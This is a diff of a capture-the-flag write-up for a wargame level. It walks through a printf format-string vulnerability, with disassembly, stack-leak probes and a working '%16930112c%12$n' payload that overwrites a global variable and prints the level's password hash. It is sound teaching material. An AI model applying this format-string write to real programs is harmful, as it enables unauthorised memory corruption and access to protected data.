@@ -1,4 +1,4 @@
-# Level 3
+# Level 4
 
 ## Setup
 We find a binary file at the root of the user **`level5`** named *`./level5`*.
@@ -21,7 +21,7 @@ On the `r2` prompt we need to run a couple of commands to analyze the `main` fun
 ```bash
 [0x08048de8]> aaa # Automatically analyze the binary
 ...
-[0x08048ec0]> V # Enter visual mode
+[0x08048ec0]> v # Enter visual mode
 ```
 
 <p align="center">
@@ -145,7 +145,7 @@ int main() {
 }
 ```
 
-We can see that this time we have, an `fgets()` function instead of a `gets()` function, which is protected against *buffer overflow*. And also a global variable `m`, which is what determines if we can access the `system("/bin/cat /home/user/level5/.pass")`.
+We can see that this time we have, an `fgets()` function instead of a `gets()` function, which is protected against *buffer overflow*, but the `printf()` is vulnerable against `format string` exploits. And also a global variable `m`, which is what determines if we can access the `system("/bin/cat /home/user/level5/.pass")`.
 
 
 ### Permissions
@@ -173,7 +173,7 @@ Continuing.
 
 AAAA 0xb7ff26b0 0xbffff684 0xb7fd0ff4 0 0 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 [0x41414141 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520]
 ```
-As we see here, the *input string* (or the *buffer*) is stored on the `EAX` register and when `printf` executes the *format specifiers* `%x`, retreiving values from the stack (as it doesn't has any parameter to retreive from), we can identify our *input string* `0x41414141 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520` on the **12th** *format specifier* / *argument*.
+As we see here, the *input string* (or the *buffer*) is stored on the `EAX` register and when `printf` executes the *format specifiers* `%x`, retreiving values from the stack (as it doesn't have any parameter to retreive from), we can identify our *input string* `0x41414141 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520 0x78232520` on the **12th** *format specifier* / *argument*.
 
 There is one *format specifier* in `printf` that allow us to store the **number of characters** written so far, into the integer pointed to by the corresponding argument: `%n`. We can specify in which argument we want this **number of characters** to be stored in, by specifying it like this: `%<argumentNumber>$n`.
 
@@ -206,9 +206,9 @@ All variables matching regular expression "m":
 0x08049810  m
 ```
 
-Our input begins on the **12th** "argument" of `printf`, so we can specify the address where we want to store the **number of characters** on our input and use `%11$n`.
+Our input begins on the **12th** "argument" of `printf`, so we can specify the address where we want to store the **number of characters** on our input and use `%12$n`.
 
-We need the *global variable* `m` (in the address `0x08049810`) to be equal to *16930116* to get access to the passw file with `system("/bin/cat /home/user/level5/.pass")`. So in order to write the number *16930116* on the variable, we can use the `%n` specifier and compose an *input string* of *16930116* bytes or characters.
+We need the *global variable* `m` (in the address `0x08049810`) to be equal to *16930116* to get access to the `.pass` file with `system("/bin/cat /home/user/level5/.pass")`. So in order to write the number *16930116* on the variable, we can use the `%n` specifier and compose an *input string* of *16930116* bytes or characters.
 
 ```bash
 0x08049810 --> \x10\x98\x04\x08
@@ -219,7 +219,7 @@ We need the *global variable* `m` (in the address `0x08049810`) to be equal to *
 
 We can execute the `printf` buffer to store the number *16930116* on the address `0x08049810` where the `m` variable is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$(printf '\x10\x98\x04\x08' && echo '%16930112c%12$n' ; cat ) | ./level4
+$ (printf '\x10\x98\x04\x08' && echo '%16930112c%12$n' ) | ./level4
 
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
